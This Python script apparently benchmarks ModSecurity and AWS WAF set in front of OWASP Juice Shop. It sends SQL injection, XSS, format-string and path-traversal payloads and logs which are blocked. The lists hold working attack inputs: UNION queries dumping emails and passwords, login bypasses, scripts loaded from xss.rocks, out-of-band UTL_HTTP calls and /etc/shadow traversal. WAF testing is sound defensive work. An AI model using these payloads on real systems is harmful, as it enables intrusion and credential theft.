import requests
import json
import os
import time
import urllib2
import sys
import socket
import subprocess
from datetime import datetime

##############################################################################################################
#Configurations
#1. Remove existing modsecurity audit logs in /usr/local/nginx/conf/logs/modsec_audit.log
#2. Restart nginx service - a new log file will be generated
#3. Send the Post/Get request to juice-shop
#4. Print out the response status code
#5. Print out the [msg: ] part in the new audit log file

print("Which WAF do you want to test?\nEnter 'modsecurity' or 'aws_waf':")
WAF_NAME = raw_input()

#Check if there any log 
print("Any Logs to capture?\nEnter 'YES' or 'NO':")
LOGS = raw_input()
if (LOGS != "YES") and (LOGS != "NO"):
    sys.exit()

#URLs for our WAF instances
mod_url = 'http://54.183.15.129:80'
aws_url = 'http://juiceshoplb-767588180.us-west-2.elb.amazonaws.com'

#Logs extraction regex
mod_rd_log = "sudo cat /usr/local/nginx/conf/logs/modsec_audit.log"
mod_sql_regex = "| grep 942 | grep -o -P '\[msg.*?\]'"
mod_xss_regex = "| grep 941 | grep -o -P '\[msg.*?\]'"
mod_sql_leakage_regex = "| grep 951 | grep -o -P '\[msg.*?\]'"
mod_normal_regex = "| grep -o -P '\[msg.*?\]'"
mod_rfi_regex = "| grep 931 | grep -o -P '\[msg.*?\]'"

#Logs refreshing commands
mod_rm_log = "sudo rm /usr/local/nginx/conf/logs/modsec_audit.log"
mod_rs_nginx = "sudo service nginx restart"

#Filling in parameters
jsurl = ""
instance_ip = ""
rd_log = ""
sql_regex = ""
xss_regex = ""
format_string_regex = ""
file_traversal_regex = ""
sqli_leakage_regex = ""
normal_regex = ""
rm_log = ""
rs_nginx = ""
valid = 0

if WAF_NAME == "modsecurity" :
    #url
    jsurl = mod_url
    #read log syntax
    rd_log = mod_rd_log
    #6 different types of logs
    sql_regex = mod_sql_regex
    xss_regex = mod_xss_regex
    format_string_regex = mod_normal_regex
    file_traversal_regex = mod_rfi_regex
    normal_regex = mod_normal_regex
    sqli_leakage_regex = mod_sql_leakage_regex
    #log removal syntax
    rm_log = mod_rm_log
    #restart nginx
    rs_nginx = mod_rs_nginx
    log_name = 'mod_test_results.csv'
    valid = 1

if WAF_NAME == "aws_waf" :
    jsurl = aws_url
    valid = 1

if valid == 0:
    print("Invalid WAF name")
    sys.exit()

if LOGS == "YES":
    f = open(log_name, 'w')

##################################################################################################################
#Part 1: SQLi Testing
print("##################SQLi Testing###################")

#Record testing results into a file
if LOGS == "YES":
    f.write('SQL Test Cases, Status_Code, Logs\n')
#number of sqli test cases
sql_num_tc = 0

#SQLi GET query list
sqlget_query_list = []
sqlget_query_list.append('invalid\')) UNION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC1
sqlget_query_list.append('invalid\')) UNI/**/ON SEL/**/ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC2
sqlget_query_list.append('invalid\')) U%6eION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC3
sqlget_query_list.append('invalid\')) UNI*ON SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC4
sqlget_query_list.append('invalid\')) UNI/%2A%2A/ON SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC5
sqlget_query_list.append('invalid\')) UnIoN SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC6
sqlget_query_list.append('invalid\')) %0A%0Dunion%0A%0D SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC7
sqlget_query_list.append('banana\' ORDER BY 1 ASC--') # TC8
sqlget_query_list.append('banana\' AND \'1\'=\'1') # TC9
sqlget_query_list.append('invalid\')) UNION SELECT 1,1,null--') # TC10
sqlget_query_list.append('banana\' AND LENGTH(username)=N AND \'1\' = \'1') # TC11
sqlget_query_list.append('banana || UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--') # TC12
sqlget_query_list.append('banana || UTL_HTTP.request(\'testerserver.com:80\'||(SELECT user FROM DUAL)--') # TC13
sqlget_query_list.append('banana || AND IF(version() like \'5%\', sleep(10), \'false\'))--') # TC14
sqlget_query_list.append('banana or \'1\'=                \'1') # TC15
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--') # TC16
sqlget_query_list.append('invalid\')) EXEC(\'UNI\'+\'ON \'+\'SEL\' + \'ECT 1\')') # TC17
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name = unhex(\'726F6F74\')--') # TC18
sqlget_query_list.append('invalid\')) UNION SELECT password FROM Users WHERE name = 726F6F74--') # TC19
sqlget_query_list.append('invalid\')) U%6eION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC20
sqlget_query_list.append('invalid\')) UNION SELECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS%2d-') # TC21
sqlget_query_list.append('invalid\')) UNION SEL*ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC22
sqlget_query_list.append('invalid\')) UNION SEL/%2A%2A/ECT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC23
sqlget_query_list.append('invalid\')) UNION SeLeCT NULL,email,password,id,NULL,NULL,NULL,NULL FROM USERS--') # TC24
sqlget_query_list.append('banana\' %4fRDER BY 1 ASC--') # TC25
sqlget_query_list.append('banana\' A%6eD \'1\'=\'1') # TC26
sqlget_query_list.append('banana\' AND LE%4eGTH(username)=N AND \'1\' = \'1') # TC27
sqlget_query_list.append('banana || UTL_I%4eADDR.GET_HOST_%4eAME( (SELECT user FROM DUAL) )--') # TC28
sqlget_query_list.append('banana || UT%4c_HTTP.request(\'testerserver.com:80\'||(SELECT user FROM DUAL)--') # TC29
sqlget_query_list.append('banana || AND IF(versio%6e() like \'5%\', sleep(10), \'false\'))--') # TC30
sqlget_query_list.append("banana or '1'= %20%20%20%20%20%20%20%20%20'1") # TC31

#SQLi POST query list
sqlpost_username_list = []
sqlpost_password_list = []
sqlpost_username_list.append('admin@juice-sh.op\'--') # TC32
sqlpost_password_list.append('foo') 
sqlpost_username_list.append('admin@juice-sh.op') # TC33
sqlpost_password_list.append('\' OR 1=1--') 
sqlpost_username_list.append("1' or '1' = '1'))-- ") # TC34
sqlpost_password_list.append('foo') 
sqlpost_username_list.append("1' or '1' = '1')) LIMIT 1-- ") # TC35
sqlpost_password_list.append('foo') 
sqlpost_username_list.append("1' or '1' = '1')) %6cIMIT 1--") # TC36
sqlpost_password_list.append('foo') 
sqlpost_username_list.append('admin@juice-sh.op') # TC37
sqlpost_password_list.append('\' %4fR 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC38
sqlpost_password_list.append('\' O/**/R 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC39
sqlpost_password_list.append('\' O/%2A%2A/R 1=1--') 
sqlpost_username_list.append('admin@juice-sh.op') # TC40
sqlpost_password_list.append("' OR 'SQLi' = 'SQL'+'i'/*") 
sqlpost_username_list.append('admin@juice-sh.op') # TC41
sqlpost_password_list.append("' OR 'SQLi' > 'S'/*") 
sqlpost_username_list.append('admin@juice-sh.op') # TC42
sqlpost_password_list.append("' OR 20 > 1--") 
sqlpost_username_list.append('admin@juice-sh.op') # TC43
sqlpost_password_list.append("' OR 2 between 3 and 1--") 
sqlpost_username_list.append('admin@juice-sh.op') # TC44
sqlpost_password_list.append("' OR 'SQLi' = N'SQLi'") 
sqlpost_username_list.append('admin@juice-sh.op') # TC45
sqlpost_password_list.append("' 1 || 1 = 1") 
sqlpost_username_list.append('admin@juice-sh.op') # TC46
sqlpost_password_list.append("' 1 && 1 = 1") 
sqlpost_username_list.append('admin@juice-sh.op') # TC47
sqlpost_password_list.append("' 1 and 1 = 1") 

#Run the get queries one by one and record the logs
for query in sqlget_query_list:
    sql_num_tc = sql_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("SQL TC%d - response status_code: %d"%(sql_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+sql_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(sql_num_tc,login.status_code, c_logs))

#Then, run the post queries one by one and record the logs
for index, query in enumerate(sqlpost_username_list):
    sql_num_tc = sql_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    session = requests.Session()
    auth = json.dumps({'email': sqlpost_username_list[index], 'password': sqlpost_password_list[index]})
    login = session.post('{}/rest/user/login'.format(jsurl),
                     headers={'Content-Type': 'application/json'},
                     data=auth)
    print("SQL TC%d - response status_code: %d"%(sql_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+sql_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(sql_num_tc,login.status_code, c_logs))



##################################################################################################################
#Part 2: XSS Testing
print("")
print("##################XSS Testing###################")

#number of xss test cases
xss_num_tc = 0

#Record testing results into a file
if LOGS == "YES":
    f.write('XSS Test Cases, Status_Code, Logs\n')

#XSS query list
query_list = []
query_list.append('<script>alert(123)</script>') # TC1
query_list.append('<img src=x onerror=alert(\'xss\')>') # TC2
query_list.append('<ScRiPt>alert(document.cookie)</ScRiPt>') # TC3
query_list.append('<scr<script>ipt>alert(document.cookie)</script>') # TC4
query_list.append('<a href="http://www.google.com">can be found here!</a>') # TC5
query_list.append('<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>') # TC6
query_list.append('<script >alert(document.cookie)</script >') # TC7
query_list.append('<SCRIPT%20a=">"%20SRC="http://xss.rocks/xss.js"></SCRIPT>') # TC8
query_list.append('<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">') # TC9
query_list.append('<IMG SRC="javascript:alert(\'XSS\');">') # TC10
query_list.append('<IMG SRC=javascript:alert(\'XSS\')>') # TC11
query_list.append('<IMG SRC=JaVaScRiPt:alert(\'XSS\')>') # TC12
query_list.append('<IMG SRC=javascript:alert(&quot;XSS&quot;)>') # TC13
query_list.append('<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>') # TC14
query_list.append('<a onmouseover="alert(document.cookie)">xss link</a>') # TC15
query_list.append('<a onmouseover=alert(document.cookie)>xss link</a>') # TC16
query_list.append('<IMG """><SCRIPT>alert("XSS")</SCRIPT>">') # TC17
query_list.append('<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>') # TC18
query_list.append('<IMG SRC=# onerror="alert(\'xss\')">') # TC19
query_list.append('<IMG SRC= onmouseover="alert(\'xss\')">') # TC20
query_list.append('<IMG onmouseover="alert(\'xss\')">') # TC21
query_list.append('<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>') # TC22
query_list.append('<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">') # TC23
query_list.append('<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; &#39;&#88;&#83;&#83;&#39;&#41;>') # TC24
query_list.append('<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>') # TC25
query_list.append('<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>') # TC26
query_list.append('<IMG SRC="jav	ascript:alert(\'XSS\');">') # TC27
query_list.append('<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">') # TC28
query_list.append('<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">') # TC29
query_list.append('<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">') # TC30
query_list.append('<IMG SRC=" &#14;  javascript:alert(\'XSS\');">') # TC31
query_list.append('<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>') # TC32
query_list.append('<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>') # TC33
query_list.append('<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>') # TC34
query_list.append('<<SCRIPT>alert("XSS");//<</SCRIPT>') # TC35
query_list.append('<SCRIPT SRC=http://xss.rocks/xss.js?< B >') # TC36
query_list.append('<SCRIPT SRC=//xss.rocks/.j>') # TC37
query_list.append('<IMG SRC="javascript:alert(\'XSS\')"') # TC38
query_list.append('<iframe src=http://xss.rocks/scriptlet.html <') # TC=39
query_list.append('</script><script>alert(\'XSS\');</script>') # TC40
query_list.append('</TITLE><SCRIPT>alert("XSS");</SCRIPT>') # TC41
query_list.append('<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">') # TC42
query_list.append('<BODY BACKGROUND="javascript:alert(\'XSS\')">') # TC43
query_list.append('<IMG DYNSRC="javascript:alert(\'XSS\')">') # TC44
query_list.append('<IMG LOWSRC="javascript:alert(\'XSS\')">') # TC45
query_list.append('<IMG SRC=\'vbscript:msgbox("XSS")\'>') # TC46
query_list.append('<svg/onload=alert(\'XSS\')>') # TC47
query_list.append('Set.constructor`alert(document.domain)```') # TC48
query_list.append('<BODY ONLOAD=alert(\'XSS\')>')  # TC49
query_list.append('<BGSOUND SRC="javascript:alert(\'XSS\');">') # TC50          
query_list.append('<BR SIZE="&{alert(\'XSS\')}">') # TC51
query_list.append('<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">')  # TC52
query_list.append('<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">')   # TC53     
query_list.append('<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>')  # TC54
query_list.append('<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">')  # TC55       
query_list.append('<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>')  # TC56
query_list.append('<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>')  # TC57
query_list.append('<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">')  # TC58
query_list.append('exp/*<A STYLE=\'no\\xss:noxss("*//*"); xss:ex/*XSS*//*/*/pression(alert("XSS"))\'>')  # TC59
query_list.append('<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>') # TC60
query_list.append('<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>')  # TC61
query_list.append('<XSS STYLE="xss:expression(alert(\'XSS\'))">')   # TC62

query_list.append('<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">')  # TC64     
query_list.append('<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">') # TC65       
query_list.append('<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>')  # TC66   
query_list.append('<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>')  # TC67     
query_list.append('<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>')  # TC68      
query_list.append('<TABLE BACKGROUND="javascript:alert(\'XSS\')">')   # TC69
query_list.append('<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">')   # TC70  
query_list.append('<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">')  # TC71
query_list.append('<DIV STYLE="background-image:\0075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">')  # TC72
query_list.append('<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">')  # TC73
query_list.append('<DIV STYLE="width: expression(alert(\'XSS\'));">')  # TC74
query_list.append('<BASE HREF="javascript:alert(\'XSS\');//">')  # TC75
query_list.append('<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>') # TC76
query_list.append('<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>') # TC77
query_list.append('<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>')  # TC78                    
query_list.append('<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML> <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>')  # TC79                    
query_list.append('<XML SRC="xsstest.xml" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>')  #80 
query_list.append('<HTML><BODY> <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"> <?import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"> </BODY></HTML>')  # TC81
query_list.append('<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->')   # TC82
query_list.append('<? echo(\'<SCR)\'; echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>')   # TC83
query_list.append('<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">')  # TC84   
query_list.append('<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">') # TC85
query_list.append('<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-') #TC86            
query_list.append('<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>')  # TC87            
query_list.append('<A HREF="http://66.102.7.147/">XSS</A>')  #TC88
query_list.append('<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>')  #TC89
query_list.append('<A HREF="http://1113982867/">XSS</A>')  #TC90
query_list.append('<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>') #TC91
query_list.append('<A HREF="http://0102.0146.0007.00000223/">XSS</A>') #TC92
query_list.append('<A HREF="h tt	p://6	6.000146.0x7.147/">XSS</A>')  #TC93
query_list.append('<A HREF="//www.google.com/">XSS</A>')  #TC94

#Run the get queries one by one and record the logs
for query in query_list:
    xss_num_tc = xss_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("XSS TC%d - response status_code: %d"%(xss_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+xss_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(xss_num_tc,login.status_code, c_logs))


##################################################################################################################
#Part 3: Format String Overflow 
print("##################Format String Testing###################")

#Record testing results into a file
if LOGS == "YES":
    f.write('Format String, Status_Code, Logs\n')
#number of sqli test cases
format_string_num_tc = 0

format_query_list = []
format_query_list.append('apple%x.%x.%x') # TC1
format_query_list.append('apple%s.%s.%s') # TC2
format_query_list.append('apple%05d.%05d.%05d') # TC3
format_query_list.append('apple%5.2f.%5.2f.%5.2f') # TC4
format_query_list.append('apple%d.%d.%d') # TC5
format_query_list.append('apple%2$d') # TC6
format_query_list.append('apple%hh') # TC7
format_query_list.append('apple%h') # TC8
format_query_list.append('apple%l') # TC9
format_query_list.append('apple%L') # TC10
format_query_list.append('apple%z') # TC11
format_query_list.append('apple%t') # TC12
format_query_list.append('apple%g') # TC13
format_query_list.append('apple%F.%F') # TC14
format_query_list.append('apple%X.%X') # TC15
format_query_list.append('apple%o.%o') # TC16
format_query_list.append('apple%n') # TC17
format_query_list.append('apple%a') # TC18
format_query_list.append('apple%A') # TC19
format_query_list.append('apple%p') # TC20
format_query_list.append('apple%c.%c.%c.%c') # TC21

#Run the get queries one by one and record the logs
for query in format_query_list:
    format_string_num_tc  = format_string_num_tc  + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("Format String TC%d - response status_code: %d"%(format_string_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+format_string_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(format_string_num_tc ,login.status_code, c_logs))


##################################################################################################################
#Part 4: RFI
print("##################Remote File Inclusion###################")

#Record testing results into a file
if LOGS == "YES":
    f.write('Remote File Inclusion, Status_Code, Logs\n')
#number of sqli test cases
file_traversal_num_tc = 0

file_traversal_list = []
file_traversal_list.append('/var/www/html/get.php') # TC1
file_traversal_list.append('/etc/passwd') # TC2
file_traversal_list.append('/usr/local/bin/nginx/conf/nginx.conf') # TC3
file_traversal_list.append('../../../../etc/passwd') # TC4
file_traversal_list.append('../../../etc/shadow') # TC5

#Run the get queries one by one and record the logs
for query in file_traversal_list:
    file_traversal_num_tc  = file_traversal_num_tc  + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("Remote File Inclusion TC%d - response status_code: %d"%(file_traversal_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log + file_traversal_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(file_traversal_num_tc, login.status_code, c_logs))

'''
##################################################################################################################
#Part 5: SQLi Leakage
print("##################Sqli Leakage Testing###################")

#Record testing results into a file
if LOGS == "YES":
    f.write('SQLi Leakage, Status_Code, Logs\n')
#number of sqli test cases
sqli_leakage_num_tc = 0

sqli_leakage_list = []
sqli_leakage_list.append('invalid\')) UNION SELECT NULL,email,email,id,NULL,NULL,NULL,NULL FROM USERS--') # TC1
sqli_leakage_list.append('banana\' ORDER BY 100--') # TC2
sqli_leakage_list.append('banana\' AND \'1\'=\'2') # TC3
sqli_leakage_list.append('invalid\')) UNION SELECT 1,2,3 FROM USERS--') # TC4
sqli_leakage_list.append('invalid\')) UNION SELECT 1,2,3 FROM WHOCARES--') # TC5

#Run the get queries one by one and record the logs
for query in file_traversal_list:
    sqli_leakage_num_tc  = sqli_leakage_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("SQLi Leakage TC%d - response status_code: %d"%(sqli_leakage_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log + sqli_leakage_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(sqli_leakage_num_tc, login.status_code, c_logs))
'''

##################################################################################################################
#Part 6: Normal Traffic Testing
print("")
print("##################Normal Traffic Testing###################")

#number of xss test cases
normal_num_tc = 0

#Record testing results into a file
if LOGS == "YES":
    f.write('Normal Test Cases, Status_Code, Logs\n')

#Normal GET query list
normal_query_list = []
normal_query_list.append('sqli') # TC1
normal_query_list.append('apple') # TC2
normal_query_list.append('banananana') # TC3
normal_query_list.append('union') # TC4
normal_query_list.append('select') # TC5
normal_query_list.append('and') # TC6
normal_query_list.append('UNION') # TC7
normal_query_list.append('or') # TC8
normal_query_list.append('OR') # TC9
normal_query_list.append('AND') # TC10
normal_query_list.append('1') # TC11
normal_query_list.append('or 1') # TC12
normal_query_list.append('and 1') # TC13
normal_query_list.append('union shop') # TC14
normal_query_list.append('and 1') # TC15
normal_query_list.append('script') # TC16
normal_query_list.append('xss alert') # TC17
normal_query_list.append('SCRIPT') # TC18
normal_query_list.append('href') # TC19
normal_query_list.append('link') # TC20
normal_query_list.append('LINK') # TC21
normal_query_list.append('HREF') # TC22
normal_query_list.append('www.google.com') # TC23
normal_query_list.append('UTL_HTTP') # TC24
normal_query_list.append('LENGTH') # TC25
normal_query_list.append('username') # TC26
normal_query_list.append('password') # TC27
normal_query_list.append('admin') # TC28
normal_query_list.append('exec') # TC29
normal_query_list.append('order') # TC30
normal_query_list.append('request') # TC31
normal_query_list.append('users') # TC32
normal_query_list.append('--') # TC33
normal_query_list.append('/**/') # TC34
normal_query_list.append('/*') # TC35


#Normal POST query list
normal_username_list = []
normal_password_list = []
normal_username_list.append('admin@juice-sh.op') # TC36
normal_password_list.append('admin123') 
normal_username_list.append('admin@juice-sh.op') # TC37
normal_password_list.append('admin12345') 
normal_username_list.append('admin@juice-sh.op') # TC38
normal_password_list.append('or') 
normal_username_list.append('admin@juice-sh.op') # TC39
normal_password_list.append('and') 
normal_username_list.append('admin@juice-sh.op') # TC40
normal_password_list.append('1=1') 
normal_username_list.append('admin@juice-sh.op') # TC41
normal_password_list.append('union') 
normal_username_list.append('admin@juice-sh.op') # TC42
normal_password_list.append('select') 
normal_username_list.append('wrongusername') # TC43
normal_password_list.append('foo') 
normal_username_list.append('john--') # TC44
normal_password_list.append('foo') 
normal_username_list.append('union') # TC45
normal_password_list.append('foo') 
normal_username_list.append('select') # TC46
normal_password_list.append('foo') 
normal_username_list.append('and') # TC47
normal_password_list.append('foo')
normal_username_list.append('or') # TC48
normal_password_list.append('foo')
normal_username_list.append('script') # TC49
normal_password_list.append('foo')
normal_username_list.append('xss alert') # TC50
normal_password_list.append('foo')
normal_username_list.append('SCRIPT') # TC51
normal_password_list.append('foo')
normal_username_list.append('href') # TC52
normal_password_list.append('foo')
normal_username_list.append('exec') # TC53
normal_password_list.append('foo')
normal_username_list.append('link') # TC54
normal_password_list.append('foo')
normal_username_list.append('UTL_HTTP') # TC55
normal_password_list.append('foo')
normal_username_list.append('LENGTH') # TC56
normal_password_list.append('foo')
normal_username_list.append('john') # TC57
normal_password_list.append('--')
normal_username_list.append('john') # TC58
normal_password_list.append('/**/')
normal_username_list.append('john') # TC59
normal_password_list.append('unhex')
normal_username_list.append('john') # TC60
normal_password_list.append('script')

#Run the get queries one by one and record the logs
for query in normal_query_list:
    normal_num_tc = normal_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    payload = {'q': query}
    login = requests.get(jsurl,params=payload)
    print("Normal TC%d - response status_code: %d"%(normal_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+normal_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(normal_num_tc,login.status_code, c_logs))

#Then, run the post queries one by one and record the logs
for index, query in enumerate(normal_username_list):
    normal_num_tc = normal_num_tc + 1
    if LOGS == "YES":
        os.system(rm_log)
        os.system(rs_nginx)
    session = requests.Session()
    auth = json.dumps({'email': normal_username_list[index], 'password': normal_password_list[index]})
    login = session.post('{}/rest/user/login'.format(jsurl),
                     headers={'Content-Type': 'application/json'},
                     data=auth)
    print("Normal TC%d - response status_code: %d"%(normal_num_tc,login.status_code))
    time.sleep(0.5)
    if LOGS == "YES":
        logs = os.popen(rd_log+normal_regex).read()
        print("Logs:%s"%(logs))
        c_logs = logs.replace('\n',' ')
        f.write('TC%d,%d,%s\n'%(normal_num_tc,login.status_code, c_logs))

#Close the .csv file
if LOGS == "YES":
    f.close()

#End of testing
print("Testing End...")
